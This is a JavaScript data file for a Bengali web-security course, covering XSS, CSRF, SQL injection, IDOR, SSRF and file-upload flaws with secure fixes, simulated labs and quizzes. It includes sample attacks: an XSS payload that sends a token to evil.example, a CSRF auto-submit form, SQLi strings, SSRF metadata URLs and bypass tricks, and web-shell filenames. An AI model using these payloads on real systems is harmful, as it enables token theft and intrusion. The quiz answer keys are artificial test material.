// Phase 02 — Common Web Attacks
export default [
  {
    id: 'xss',
    phase: 2,
    no: '06',
    icon: '📜',
    title: 'XSS — Cross-Site Scripting',
    subtitle: 'অন্যের browser-এ attacker-এর JavaScript',
    duration: '৪০ মিনিট',
    goals: ['Stored, Reflected ও DOM XSS', 'XSS দিয়ে কী চুরি করা যায়', 'React-এ dangerouslySetInnerHTML-এর ঝুঁকি', 'Output encoding, sanitization ও CSP'],
    steps: [
      {
        title: 'আক্রমণটা বোঝো',
        body: 'XSS ঘটে যখন তোমার app user-এর দেওয়া data-কে HTML হিসেবে page-এ বসিয়ে দেয়। Attacker তখন <script> বা event handler ঢুকিয়ে অন্য ভিজিটরের browser-এ নিজের JavaScript চালায় — তোমার domain-এর পূর্ণ ক্ষমতা নিয়ে।',
        points: ['Stored XSS — comment/profile-এ সংরক্ষিত, সবাইকে আক্রমণ করে', 'Reflected XSS — URL parameter সাথে সাথে page-এ প্রতিফলিত', 'DOM XSS — শুধু client-side JS-এ (location.hash → innerHTML)'],
      },
      {
        title: 'কীভাবে ঘটে',
        body: 'Comment box-এ attacker লিখল নিচের payload। Server এটা database-এ রাখল। প্রতিটি ভিজিটর page খুললে browser এটাকে HTML হিসেবে parse করে, image load ব্যর্থ হয়, onerror চলে — আর cookie/token attacker-এর server-এ চলে যায়।',
        code: [{ label: 'Payload', lang: 'html', kind: 'bad', text: '<img src=x onerror="fetch(\'https://evil.example/c?d=\'+localStorage.token)">' }],
        points: ['Session/token চুরি', 'User-এর হয়ে action (password বদল, টাকা পাঠানো)', 'ভুয়া login form দেখিয়ে credential নেওয়া', 'Keylogging'],
      },
      {
        title: 'React/Next.js-এ কোথায় ঝুঁকি?',
        body: 'React {variable} ডিফল্টে escape করে — এটা নিরাপদ। ঝুঁকি আসে যখন তুমি escape এড়িয়ে যাও:',
        code: [
          { label: 'দুর্বল', lang: 'jsx', kind: 'bad', text: '<div dangerouslySetInnerHTML={{ __html: comment.body }} />\n<a href={user.website}>Website</a>   // javascript:alert(1)\nel.innerHTML = location.hash.slice(1)' },
          { label: 'নিরাপদ', lang: 'jsx', kind: 'good', text: "import DOMPurify from 'isomorphic-dompurify'\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }} />\n\nconst safe = /^https?:\\/\\//.test(url) ? url : '#'\n<a href={safe}>Website</a>" },
        ],
      },
      {
        title: 'সমাধান — Defense in Depth',
        body: 'মূল নিয়ম: context অনুযায়ী output encode করো। তারপর অতিরিক্ত স্তর যোগ করো:',
        points: ['Output encoding: < → &lt;, > → &gt;', 'Rich HTML দরকার হলে DOMPurify দিয়ে sanitize', 'URL-এ শুধু http/https scheme allow', 'Content-Security-Policy: script-src \'self\' — inline script বন্ধ', 'HttpOnly cookie — JS cookie পড়তে পারবে না', 'Token localStorage-এ নয়'],
        code: [{ label: 'Express · CSP header', lang: 'js', kind: 'good', text: 'app.use((req, res, next) => {\n  res.setHeader(\'Content-Security-Policy\',\n    "default-src \'self\'; script-src \'self\'; object-src \'none\'; base-uri \'self\'");\n  next();\n});\n// সহজ উপায়: app.use(helmet()) — CSP সহ অনেক security header একসাথে' }],
      },
    ],
    labs: [{ type: 'xss', title: 'Guestbook XSS Lab', intro: 'একটি সিমুলেটেড guestbook। Payload লিখে দেখো vulnerable mode-এ কী ঘটে (script আসলে চলে না — নিরাপদ sandbox simulation)। তারপর এক এক করে defense চালু করো।' }],
    quiz: [
      { q: 'XSS-এ attacker-এর code কোথায় চলে?', options: ['Server-এ', 'ভিকটিমের browser-এ', 'Database-এ', 'Nginx-এ'], answer: 1, explain: 'Client-side attack, তোমার domain-এর origin নিয়ে।' },
      { q: 'React-এ কোনটি XSS-এর জন্য ঝুঁকিপূর্ণ?', options: ['{comment.body}', 'dangerouslySetInnerHTML', 'useState', 'className'], answer: 1, explain: 'Escape এড়িয়ে raw HTML বসায়।' },
      { q: 'কোন header inline script চালানো আটকায়?', options: ['X-Frame-Options', 'Content-Security-Policy', 'HSTS', 'CORS'], answer: 1, explain: 'CSP script-src।' },
      { q: '<a href={url}>-এ কোন URL বিপজ্জনক?', options: ['https://a.com', 'javascript:alert(1)', '/about', 'mailto:x@y.z'], answer: 1, explain: 'javascript: scheme কোড চালায়।' },
    ],
    cheat: {
      category: 'Web Attacks', severity: 'high',
      summary: 'User input HTML হিসেবে render হলে attacker-এর JS ভিকটিমের browser-এ চলে।',
      rules: ['Context-aware output encoding', 'dangerouslySetInnerHTML শুধু DOMPurify-এর পরে', 'href-এ শুধু http(s)', 'CSP: script-src \'self\'', 'HttpOnly cookie', 'Token localStorage-এ নয়'],
      checklist: ['grep dangerouslySetInnerHTML / innerHTML', 'সব input field-এ <img src=x onerror=alert(1)> test', 'CSP header আছে কিনা'],
      commands: ['grep -rn "dangerouslySetInnerHTML\\|innerHTML" src/'],
      remember: 'Data কখনো code হতে দেবে না।',
    },
  },

  {
    id: 'csrf',
    phase: 2,
    no: '07',
    icon: '🎭',
    title: 'CSRF — Cross-Site Request Forgery',
    subtitle: 'তোমার browser দিয়ে তোমার অজান্তে request',
    duration: '৩০ মিনিট',
    goals: ['CSRF কীভাবে cookie-র স্বয়ংক্রিয় পাঠানো কাজে লাগায়', 'SameSite cookie', 'CSRF token pattern', 'কখন CSRF প্রযোজ্য নয় (Bearer token)'],
    steps: [
      {
        title: 'আক্রমণটা বোঝো',
        body: 'তুমি bank.example-এ logged in। অন্য tab-এ evil.example খুললে। সেই page-এ একটি লুকানো form আছে যা bank.example/transfer-এ POST করে। Browser স্বয়ংক্রিয়ভাবে তোমার bank cookie সাথে পাঠায় — bank ভাবে তুমিই request করেছ!',
        code: [{ label: 'evil.example-এর লুকানো form', lang: 'html', kind: 'bad', text: '<form action="https://bank.example/api/transfer" method="POST" id="f">\n  <input type="hidden" name="to" value="attacker">\n  <input type="hidden" name="amount" value="50000">\n</form>\n<script>document.getElementById("f").submit()</script>' }],
      },
      {
        title: 'কেন কাজ করে?',
        body: 'CSRF-এর তিনটি শর্ত: (১) cookie-based authentication, (২) state-changing action (transfer, email change), (৩) request-এ এমন কিছু নেই যা attacker অনুমান করতে পারবে না। Attacker response পড়তে পারে না — কিন্তু action ঘটাতে পারে।',
      },
      {
        title: 'সমাধান',
        body: 'একাধিক স্তর:',
        points: ['SameSite=Lax বা Strict cookie — cross-site POST-এ cookie যায় না (আধুনিক browser-এ Lax ডিফল্ট)', 'CSRF token — প্রতিটি form-এ গোপন র‍্যান্ডম token, server যাচাই করে', 'Origin / Referer header যাচাই', 'State change কখনো GET দিয়ে নয়', 'গুরুত্বপূর্ণ কাজে re-authentication'],
        code: [{ label: 'Express · CSRF token যাচাই', lang: 'js', kind: 'good', text: '// login-এর সময় একটি random token বানাও, session-এ রাখো, page-এ পাঠাও\nreq.session.csrf = crypto.randomBytes(32).toString(\'hex\');\n\n// কিছু বদলায় এমন প্রতিটি request-এ token মিলিয়ে দেখো\napp.use((req, res, next) => {\n  if ([\'GET\', \'HEAD\', \'OPTIONS\'].includes(req.method)) return next();\n  if (req.get(\'X-CSRF-Token\') !== req.session.csrf) return res.sendStatus(403);\n  next();\n});' }],
        tip: 'শুধু Authorization: Bearer header দিয়ে auth করলে (cookie নয়), browser নিজে থেকে token পাঠায় না — তাই classic CSRF প্রযোজ্য নয়। কিন্তু তখন XSS-এর ঝুঁকি বাড়ে।',
      },
    ],
    labs: [
      {
        type: 'flow',
        title: 'CSRF Attack Flow',
        intro: 'তিনটি mode চালিয়ে দেখো: আক্রমণ কীভাবে হয়, SameSite কীভাবে আটকায়, CSRF token কীভাবে আটকায়।',
        nodes: [
          { id: 'user', label: 'তোমার Browser', icon: '🧑', sub: 'bank-এ logged in' },
          { id: 'evil', label: 'evil.example', icon: '😈', sub: 'Attacker-এর site' },
          { id: 'bank', label: 'bank.example', icon: '🏦', sub: 'Node.js API' },
        ],
        modes: [
          { id: 'a', name: 'Attack (কোনো সুরক্ষা নেই)', kind: 'attack', hops: [
            { from: 'user', to: 'bank', label: 'Login ✓ cookie পেলে', desc: 'তুমি bank-এ login করলে, browser-এ session cookie আছে (SameSite=None)।' },
            { from: 'user', to: 'evil', label: 'evil page খুললে', desc: 'একটি "মজার video" link-এ ক্লিক করে evil.example খুললে।' },
            { from: 'evil', to: 'user', label: 'hidden form + auto-submit', status: 'evil', desc: 'Page-এ লুকানো form আছে যা নিজে থেকেই submit হয়।' },
            { from: 'user', to: 'bank', label: 'POST /transfer 🍪', status: 'evil', desc: 'Browser bank.example-এ POST পাঠায় — এবং স্বয়ংক্রিয়ভাবে তোমার session cookie জুড়ে দেয়!' },
            { from: 'bank', to: 'user', label: '200 ৳50,000 sent 😱', status: 'evil', desc: 'Bank valid cookie দেখে transfer করে দিল। তুমি কিছুই টের পেলে না।' },
          ] },
          { id: 'b', name: 'Defense: SameSite=Lax', kind: 'defense', hops: [
            { from: 'user', to: 'evil', label: 'evil page খুললে', desc: 'একই পরিস্থিতি।' },
            { from: 'evil', to: 'user', label: 'hidden form', status: 'evil', desc: 'Auto-submit form।' },
            { from: 'user', to: 'bank', label: 'POST /transfer (no 🍪)', status: 'blocked', desc: 'Cookie SameSite=Lax — cross-site POST-এ browser cookie পাঠায় না।' },
            { from: 'bank', to: 'user', label: '401 Unauthorized', status: 'blocked', desc: 'Cookie নেই → user অচেনা → আক্রমণ ব্যর্থ।' },
          ] },
          { id: 'c', name: 'Defense: CSRF Token', kind: 'defense', hops: [
            { from: 'bank', to: 'user', label: 'form + csrf=9f3a…', desc: 'Bank-এর নিজের form-এ একটি গোপন র‍্যান্ডম token থাকে।' },
            { from: 'evil', to: 'user', label: 'hidden form (no token)', status: 'evil', desc: 'Attacker token জানে না — অন্য origin থেকে পড়তে পারে না (Same-Origin Policy)।' },
            { from: 'user', to: 'bank', label: 'POST 🍪 but no token', status: 'evil', desc: 'Cookie গেল, কিন্তু X-CSRF-Token নেই বা ভুল।' },
            { from: 'bank', to: 'user', label: '403 CSRF failed', status: 'blocked', desc: 'Server token মেলাতে পারল না → প্রত্যাখ্যান।' },
          ] },
        ],
      },
    ],
    quiz: [
      { q: 'CSRF কোন authentication পদ্ধতিতে সবচেয়ে বেশি প্রযোজ্য?', options: ['Cookie-based session', 'Bearer token header', 'API key in header', 'mTLS'], answer: 0, explain: 'Browser cookie নিজে থেকে পাঠায়।' },
      { q: 'CSRF attacker কি response পড়তে পারে?', options: ['হ্যাঁ', 'না, শুধু action ঘটাতে পারে', 'শুধু JSON', 'শুধু HTTPS-এ'], answer: 1, explain: 'Same-Origin Policy পড়া আটকায়।' },
      { q: 'GET /api/delete-account — সমস্যা কী?', options: ['কোনো সমস্যা নেই', 'State change GET দিয়ে — <img> দিয়েই CSRF সম্ভব', 'খুব ধীর', 'Cache হয় না'], answer: 1, explain: 'GET-এ SameSite=Lax-ও cookie পাঠায় (top-level navigation)।' },
    ],
    cheat: {
      category: 'Web Attacks', severity: 'high',
      summary: 'অন্য site তোমার browser দিয়ে cookie সহ state-changing request পাঠায়।',
      rules: ['SameSite=Lax/Strict', 'CSRF token (server-এ যাচাই)', 'Origin header যাচাই', 'State change কখনো GET-এ নয়', 'সংবেদনশীল কাজে re-auth'],
      checklist: ['Cookie-তে SameSite আছে?', 'POST/PUT/DELETE-এ token যাচাই হয়?', 'অন্য origin থেকে form submit test'],
      remember: 'Cookie নিজে থেকে যায় — তাই শুধু cookie যথেষ্ট প্রমাণ নয়।',
    },
  },

  {
    id: 'sqli',
    phase: 2,
    no: '08',
    icon: '💉',
    title: 'SQL Injection',
    subtitle: 'Input দিয়ে query-র অর্থ বদলে দেওয়া',
    duration: '৪৫ মিনিট',
    goals: ['String concatenation কেন বিপজ্জনক', 'Login bypass, UNION, blind SQLi', 'JavaScript-এ parameterized query', 'Least privilege ও error handling'],
    steps: [
      {
        title: 'আক্রমণটা বোঝো',
        body: 'SQL Injection হলো এমন আক্রমণ যেখানে attacker untrusted input দিয়ে তোমার SQL query-র গঠন বদলে দেয়। ফলাফল: login bypass, পুরো database dump, data মুছে ফেলা, কখনো server-এ command execution।',
      },
      {
        title: 'কীভাবে ঘটে',
        body: 'Normal login: email = sabuj@x.com। Backend query বানায় string জোড়া দিয়ে। এখন attacker email-এ লিখল: \' OR \'1\'=\'1\' -- । Query-র শর্ত সবসময় সত্য হয়ে গেল এবং -- বাকি অংশ (password check) comment করে দিল।',
        code: [
          { label: 'দুর্বল · JavaScript', lang: 'js', kind: 'bad', text: 'const q = "SELECT id, role FROM users WHERE email = \'" + email +\n          "\' AND password_hash = \'" + hash + "\'";\nconst { rows } = await db.query(q);' },
          { label: 'Attack-এর পরে আসল query', lang: 'sql', kind: 'bad', text: "SELECT id, role FROM users\nWHERE email = '' OR '1'='1' -- ' AND password_hash = '...'" },
        ],
      },
      {
        title: 'আরও ভয়ংকর রূপ',
        body: 'Login bypass শুধু শুরু:',
        points: ["UNION-based: ' UNION SELECT email, password_hash FROM users-- → অন্য টেবিলের data", "Error-based: ভুল query-র error message থেকে schema জানা", "Blind (Boolean/Time): ' AND pg_sleep(5)-- → response সময় দেখে এক বিট করে data বের করা", "Stacked: '; DROP TABLE orders;--"],
        warn: 'ORDER BY, table name, column name — এগুলো parameterize করা যায় না। এসবের জন্য allowlist ব্যবহার করো।',
      },
      {
        title: 'সমাধান',
        body: 'Parameterized query-তে SQL গঠন আগে থেকে ঠিক থাকে, input শুধু data হিসেবে বসে — কখনো code হয় না।',
        code: [
          { label: 'নিরাপদ · JavaScript (node-postgres)', lang: 'js', kind: 'good', text: 'const { rows } = await db.query(\n  \'SELECT id, role, password_hash FROM users WHERE email = $1\',\n  [email],\n);\n// তারপর: await bcrypt.compare(password, rows[0].password_hash)' },
          { label: 'ORDER BY allowlist', lang: 'js', kind: 'good', text: 'const allowed = { price: \'price\', date: \'created_at\' };\nconst col = allowed[req.query.sort] ?? \'created_at\';' },
        ],
        points: ['সব জায়গায় parameterized query / ORM (Prisma, Drizzle, Sequelize)', 'Input validation (email format, int ID)', 'App DB user-এর least privilege — DROP/superuser নয়', 'Database error client-কে দেখাবে না'],
      },
    ],
    labs: [{ type: 'sqli', title: 'Vulnerable Login Lab', intro: 'এটি সম্পূর্ণ সিমুলেটেড login (তোমার browser-এই চলে)। Input দিলে backend কোন query বানায় তা লাইভ দেখো, login bypass করো, অন্য টেবিলের data বের করো — তারপর Parameterized Mode চালু করে দেখো সব ব্যর্থ হয়।' }],
    quiz: [
      { q: 'SQLi প্রতিরোধের প্রধান উপায়?', options: ['HTTPS', 'Parameterized query', 'Password hashing', 'CAPTCHA'], answer: 1, explain: 'Input কখনো query-র code হয় না।' },
      { q: 'SQL-এ "--" কী করে?', options: ['বিয়োগ', 'বাকি লাইন comment', 'টেবিল মোছে', 'Loop'], answer: 1, explain: 'এর পরের অংশ উপেক্ষিত।' },
      { q: 'ORDER BY column নাম user থেকে নিলে কী করবে?', options: ['$1 parameter', 'Allowlist', 'Base64', 'কিছু না'], answer: 1, explain: 'Identifier parameterize হয় না।' },
      { q: "' AND pg_sleep(5)-- কোন ধরনের SQLi?", options: ['UNION', 'Time-based blind', 'Error-based', 'Stored XSS'], answer: 1, explain: 'Response সময় দেখে তথ্য বের করা।' },
    ],
    cheat: {
      category: 'Database Security', severity: 'critical',
      summary: 'Untrusted input SQL query-তে জোড়া লাগালে attacker query-র অর্থ বদলাতে পারে।',
      rules: ['Parameterized query সব জায়গায় ($1, $2)', 'Identifier-এর জন্য allowlist', 'Least-privilege DB user', 'DB error client-কে নয়', 'Input validation'],
      checklist: ['grep "SELECT.*\" +" / fmt.Sprintf দিয়ে SQL', "প্রতিটি input-এ ' দিয়ে test", 'App user superuser নয় তো?'],
      commands: ['grep -rn "fmt.Sprintf(\\"SELECT" .', 'sqlmap -u "http://localhost/item?id=1" (শুধু নিজের lab)'],
      remember: 'Raw user input কখনো SQL string-এ নয়।',
    },
  },

  {
    id: 'idor',
    phase: 2,
    no: '09',
    icon: '🔢',
    title: 'IDOR / BOLA',
    subtitle: 'ID বদলালেই অন্যের data',
    duration: '৩০ মিনিট',
    goals: ['Insecure Direct Object Reference কী', 'API-তে BOLA (OWASP API #1)', 'Sequential ID-এর ঝুঁকি', 'Ownership check pattern'],
    steps: [
      {
        title: 'আক্রমণটা বোঝো',
        body: 'তুমি নিজের invoice দেখছ: GET /api/invoices/1001। URL-এ 1001 কে 1002 করলে যদি অন্য কারো invoice দেখা যায় — সেটাই IDOR (Insecure Direct Object Reference)। API জগতে একে বলে BOLA (Broken Object Level Authorization) — OWASP API Top 10-এর #1।',
      },
      {
        title: 'কেন এত সাধারণ?',
        body: 'Developer ভাবে "user তো শুধু UI থেকে নিজের ID-ই পাবে"। কিন্তু attacker Burp Intruder দিয়ে 1 থেকে 100000 পর্যন্ত সব ID চেষ্টা করতে পারে কয়েক মিনিটে। Mobile app-এর API বিশেষ করে ঝুঁকিপূর্ণ।',
        points: ['/api/users/:id/profile', '/api/orders/:id', '/api/files/download?id=…', 'GraphQL: user(id: 5) { email }'],
      },
      {
        title: 'সমাধান',
        body: 'প্রতিটি object access-এ server যাচাই করবে: এই user কি এই object-এর মালিক বা অনুমতিপ্রাপ্ত?',
        code: [
          { label: 'দুর্বল', lang: 'js', kind: 'bad', text: 'await db.query(\'SELECT * FROM invoices WHERE id = $1\', [req.params.id]);' },
          { label: 'নিরাপদ', lang: 'js', kind: 'good', text: 'const { rows } = await db.query(\n  \'SELECT * FROM invoices WHERE id = $1 AND user_id = $2\',\n  [req.params.id, req.user.id],\n);\nif (rows.length === 0) return res.sendStatus(404);' },
        ],
        points: ['প্রতিটি query-তে owner শর্ত', 'UUID ব্যবহার enumeration কঠিন করে — কিন্তু authorization-এর বিকল্প নয়', '/api/me/invoices pattern — ID client থেকে নেওয়াই লাগে না', 'Automated test: user A-এর token দিয়ে user B-এর resource'],
      },
    ],
    labs: [
      {
        type: 'request',
        title: 'IDOR Hunter Lab',
        intro: 'তুমি user #7। তোমার invoice #1001। ID বদলে অন্য user-এর invoice খুঁজে বের করো (একটিতে লুকানো FLAG আছে)। তারপর Secure Mode চালু করো।',
        server: 'api.shop.local',
        secureLabel: 'Ownership check (AND user_id=$2)',
        presets: [
          { name: 'আমার invoice', req: { method: 'GET', path: '/api/invoices/1001', headers: 'Authorization: Bearer token_rahim_u7', body: '' } },
          { name: 'পরের ID', req: { method: 'GET', path: '/api/invoices/1002', headers: 'Authorization: Bearer token_rahim_u7', body: '' } },
          { name: '/api/me pattern', req: { method: 'GET', path: '/api/me/invoices', headers: 'Authorization: Bearer token_rahim_u7', body: '' } },
        ],
        handler: 'invoiceApi',
        tasks: [
          { id: 'own', text: 'নিজের invoice #1001 দেখো' },
          { id: 'other', text: 'অন্য user-এর একটি invoice দেখো' },
          { id: 'flag', text: 'CEO-র invoice-এ লুকানো FLAG খুঁজে বের করো (hint: 1000-এর আশেপাশে নয়, ছোট ID)' },
          { id: 'fixed', text: 'Secure mode-এ অন্যের invoice চেষ্টা করে 404 পাও' },
        ],
      },
    ],
    quiz: [
      { q: 'UUID ব্যবহার করলে কি IDOR সম্পূর্ণ সমাধান হয়?', options: ['হ্যাঁ', 'না — অনুমান কঠিন করে, কিন্তু authorization লাগবেই', 'শুধু v4-এ', 'শুধু PostgreSQL-এ'], answer: 1, explain: 'UUID leak হতে পারে (URL, log, share link)।' },
      { q: 'BOLA-এর পূর্ণরূপ?', options: ['Broken Object Level Authorization', 'Basic Online Login Attack', 'Bad OAuth Login Access', 'Backend Object Lock API'], answer: 0, explain: 'OWASP API Security #1।' },
      { q: 'অন্যের resource চাইলে কোন response ভালো (existence লুকাতে)?', options: ['200 খালি', '404 Not Found', '500', '302'], answer: 1, explain: '403 বললে বোঝা যায় resource আছে।' },
    ],
    cheat: {
      category: 'Access Control', severity: 'critical',
      summary: 'Object ID বদলালেই অন্যের data — কারণ server ownership যাচাই করে না।',
      rules: ['প্রতিটি query-তে AND user_id = current_user', 'সম্ভব হলে /api/me/... pattern', 'UUID = defense in depth, সমাধান নয়', 'অন্যের resource → 404'],
      checklist: ['দুই account বানিয়ে cross-access test', 'প্রতিটি :id route তালিকা করো', 'Mobile API-ও test করো'],
      commands: ['Burp Intruder / ffuf দিয়ে ID range (নিজের lab)'],
      remember: 'ID দেখানো ঠিক আছে — যাচাই না করাটা ভুল।',
    },
  },

  {
    id: 'ssrf',
    phase: 2,
    no: '10',
    icon: '🪃',
    title: 'SSRF — Server-Side Request Forgery',
    subtitle: 'তোমার server-কে দিয়ে internal network-এ request',
    duration: '৩৫ মিনিট',
    goals: ['SSRF কোথায় ঘটে (URL preview, webhook, image fetch)', 'Cloud metadata (169.254.169.254) চুরি', 'Internal service (Redis, admin) আক্রমণ', 'Allowlist ও network-level প্রতিরক্ষা'],
    steps: [
      {
        title: 'আক্রমণটা বোঝো',
        body: 'তোমার app-এ একটি feature আছে: "URL দাও, আমরা preview দেখাব" বা "Image URL থেকে avatar import"। Server সেই URL-এ request পাঠায়। Attacker যদি URL দেয় http://localhost:6379 বা http://169.254.169.254/ — তখন তোমার server নিজের internal network-এ attacker-এর হয়ে request পাঠায়!',
      },
      {
        title: 'কেন বিপজ্জনক?',
        body: 'Server internal network-এর ভেতরে আছে — firewall-এর পেছনে। তাই সে এমন জায়গায় পৌঁছাতে পারে যেখানে attacker পারে না:',
        points: ['Cloud metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ → AWS key!', 'Internal admin panel: http://10.0.0.5:8080/admin', 'Redis/Elasticsearch internal port', 'file:///etc/passwd (যদি scheme allow থাকে)'],
        warn: '২০১৯ সালের Capital One breach — SSRF দিয়ে AWS metadata থেকে credential নিয়ে ১০ কোটির বেশি গ্রাহকের data চুরি হয়।',
      },
      {
        title: 'Bypass কৌশল (কেন blocklist যথেষ্ট নয়)',
        body: '"localhost" ব্লক করলে attacker ব্যবহার করে: 127.1, 0.0.0.0, [::1], 2130706433 (decimal IP), localtest.me (DNS → 127.0.0.1), redirect (external URL যা 302 দিয়ে internal-এ পাঠায়), DNS rebinding।',
      },
      {
        title: 'সমাধান',
        body: 'Allowlist + resolved IP যাচাই + network isolation:',
        code: [{ label: 'Node.js · নিরাপদ fetch', lang: 'js', kind: 'good', text: 'import dns from \'node:dns/promises\';\nimport ipaddr from \'ipaddr.js\';\n\nconst u = new URL(raw);                          // ভুল URL হলে এখানেই error\nif (u.protocol !== \'https:\') throw badRequest();\nif (!allowedHosts.has(u.hostname)) throw badRequest();\n\nconst addrs = await dns.lookup(u.hostname, { all: true });\nfor (const { address } of addrs) {\n  // private, loopback, link-local — সব ভেতরের ঠিকানা বাদ\n  if (ipaddr.parse(address).range() !== \'unicast\') throw badRequest();\n}\n\nconst res = await fetch(u, {\n  redirect: \'manual\',                            // redirect follow করো না\n  signal: AbortSignal.timeout(5000),\n});' }],
        points: ['Host allowlist', 'শুধু https scheme', 'Resolve করা IP private/loopback/link-local হলে বাতিল', 'Redirect follow বন্ধ', 'AWS IMDSv2 চালু (token লাগে)', 'Fetcher service আলাদা network-এ'],
      },
    ],
    labs: [
      {
        type: 'request',
        title: 'SSRF Lab — URL Preview Feature',
        intro: 'App-এর /api/preview?url= endpoint যেকোনো URL fetch করে title দেখায়। এটা দিয়ে internal জিনিস পড়ার চেষ্টা করো। তারপর Secure Mode চালু করে bypass চেষ্টা করো।',
        server: 'api.shop.local',
        secureLabel: 'Allowlist + private IP block',
        presets: [
          { name: 'সাধারণ preview', req: { method: 'GET', path: '/api/preview?url=https://example.com', headers: 'Authorization: Bearer token_rahim_u7', body: '' } },
          { name: 'Localhost admin', req: { method: 'GET', path: '/api/preview?url=http://localhost:8080/admin', headers: 'Authorization: Bearer token_rahim_u7', body: '' } },
          { name: 'Cloud metadata', req: { method: 'GET', path: '/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers: 'Authorization: Bearer token_rahim_u7', body: '' } },
        ],
        handler: 'ssrfApi',
        tasks: [
          { id: 'ok', text: 'একটি সাধারণ external URL preview করো' },
          { id: 'internal', text: 'Internal admin panel (localhost:8080) পড়ো' },
          { id: 'meta', text: 'Cloud metadata থেকে AWS credential বের করো' },
          { id: 'bypass', text: 'Secure mode-এ 127.1 বা decimal IP দিয়ে bypass চেষ্টা করো — ব্লক হতে দেখো' },
        ],
      },
    ],
    quiz: [
      { q: '169.254.169.254 কী?', options: ['Google DNS', 'Cloud instance metadata service', 'Localhost', 'Cloudflare IP'], answer: 1, explain: 'AWS/GCP/Azure metadata endpoint।' },
      { q: 'SSRF-এ শুধু "localhost" blocklist কেন যথেষ্ট নয়?', options: ['127.1, [::1], decimal IP, DNS trick দিয়ে bypass', 'Localhost সবসময় নিরাপদ', 'Blocklist ধীর', 'HTTPS লাগে'], answer: 0, explain: 'Allowlist + resolved IP চেক দরকার।' },
      { q: 'কোন feature সাধারণত SSRF-প্রবণ?', options: ['URL preview / webhook / image import', 'Logout button', 'CSS file', 'Static HTML'], answer: 0, explain: 'যেখানে server user-দেওয়া URL fetch করে।' },
    ],
    cheat: {
      category: 'Web Attacks', severity: 'critical',
      summary: 'User-দেওয়া URL server fetch করলে attacker internal network / cloud metadata-তে পৌঁছায়।',
      rules: ['Host allowlist', 'শুধু https', 'Resolve-করা IP private হলে block', 'Redirect follow বন্ধ', 'IMDSv2', 'Fetcher আলাদা network-এ'],
      checklist: ['URL নেয় এমন সব endpoint তালিকা', 'http://127.0.0.1, 169.254.169.254 test', 'Webhook URL validation'],
      remember: 'তোমার server-এর হাত attacker-এর হাতে দিও না।',
    },
  },

  {
    id: 'upload',
    phase: 2,
    no: '11',
    icon: '📤',
    title: 'File Upload Vulnerability',
    subtitle: 'ছবির নামে web shell',
    duration: '৩০ মিনিট',
    goals: ['Extension, MIME ও magic bytes-এর পার্থক্য', 'Web shell, SVG XSS, zip bomb', 'নিরাপদ storage (S3/R2, আলাদা domain)', 'Size ও rate limit'],
    steps: [
      {
        title: 'আক্রমণটা বোঝো',
        body: 'Avatar upload feature। Attacker "photo.php" বা "shell.jpg.php" upload করল। Server যদি ফাইলটি web root-এ রাখে এবং PHP/CGI চালায় — attacker এখন server-এ command চালাতে পারে (Remote Code Execution)। Node.js-এর মতো platform-এ সরাসরি execute কম হলেও অন্য ঝুঁকি আছে।',
        points: ['Web shell (.php, .jsp) → RCE', 'SVG-তে <script> → Stored XSS', 'HTML ফাইল → phishing page তোমার domain-এ', 'Zip bomb / 10GB ফাইল → DoS', 'Filename: ../../etc/cron.d/x → path traversal', 'ImageMagick/ffmpeg parser exploit'],
      },
      {
        title: 'যাচাই কেন কঠিন',
        body: 'Content-Type header (image/png) client পাঠায় — বদলানো যায়। Extension বদলানো যায়। তাই ফাইলের প্রথম কয়েকটি byte (magic bytes) দেখে আসল type নির্ধারণ করো: PNG = 89 50 4E 47, JPEG = FF D8 FF।',
      },
      {
        title: 'সমাধান',
        body: '',
        code: [{ label: 'Express + multer · নিরাপদ upload', lang: 'js', kind: 'good', text: 'import multer from \'multer\';\nimport { fileTypeFromBuffer } from \'file-type\';\n\nconst upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 5 * 1024 * 1024 } });\n\napp.post(\'/api/avatar\', requireLogin, upload.single(\'avatar\'), async (req, res) => {\n  const type = await fileTypeFromBuffer(req.file.buffer);   // নাম নয়, আসল byte দেখে ধরন বোঝো\n  if (![\'image/png\', \'image/jpeg\'].includes(type?.mime)) return res.sendStatus(415);\n\n  const name = crypto.randomUUID() + \'.\' + type.ext;        // user-এর দেওয়া নাম ব্যবহার নয়\n  // re-encode করো (metadata/payload সরে যায়) → S3/R2-তে রাখো\n});' }],
        points: ['Allowlist extension + magic bytes', 'নতুন random filename', 'Web root-এর বাইরে বা object storage (S3/R2)', 'আলাদা domain থেকে serve (usercontent.example)', 'Content-Disposition: attachment, X-Content-Type-Options: nosniff', 'Image re-encode', 'Size limit + malware scan'],
      },
    ],
    labs: [{ type: 'upload', title: 'Upload Gatekeeper Lab', intro: 'বিভিন্ন malicious ফাইল upload করার চেষ্টা হচ্ছে। Defense চালু/বন্ধ করে প্রতিটি ফাইল পরীক্ষা করো। লক্ষ্য: সব malicious ফাইল আটকাও কিন্তু আসল ছবি যেন pass করে।' }],
    quiz: [
      { q: 'ফাইলের আসল type নির্ধারণের সবচেয়ে নির্ভরযোগ্য উপায়?', options: ['Extension', 'Content-Type header', 'Magic bytes', 'Filename length'], answer: 2, explain: 'Client header ও extension বদলাতে পারে।' },
      { q: 'SVG upload কেন ঝুঁকিপূর্ণ?', options: ['বড় ফাইল', 'ভেতরে <script> থাকতে পারে', 'রং নষ্ট হয়', 'কোনো ঝুঁকি নেই'], answer: 1, explain: 'SVG = XML, script চালাতে পারে।' },
      { q: 'Upload করা ফাইলের নাম কী রাখা উচিত?', options: ['User-এর দেওয়া নাম', 'Random UUID', 'User-এর email', 'Timestamp + আসল নাম'], answer: 1, explain: 'Path traversal ও overwrite এড়ায়।' },
    ],
    cheat: {
      category: 'Web Attacks', severity: 'high',
      summary: 'Upload ফাইল দিয়ে RCE, XSS, DoS বা path traversal।',
      rules: ['Extension allowlist + magic bytes', 'Random filename', 'Web root-এর বাইরে / S3 / R2', 'আলাদা domain থেকে serve', 'Size limit (BodyLimit, client_max_body_size)', 'nosniff + attachment', 'Image re-encode'],
      checklist: ['shell.php.jpg, evil.svg, ../x.png test', 'Upload folder-এ execute বন্ধ?'],
      remember: 'Upload করা প্রতিটি ফাইল শত্রু।',
    },
  },

  {
    id: 'traversal',
    phase: 2,
    no: '12',
    icon: '📂',
    title: 'Path Traversal',
    subtitle: '../../ দিয়ে server-এর ফাইল পড়া',
    duration: '২৫ মিনিট',
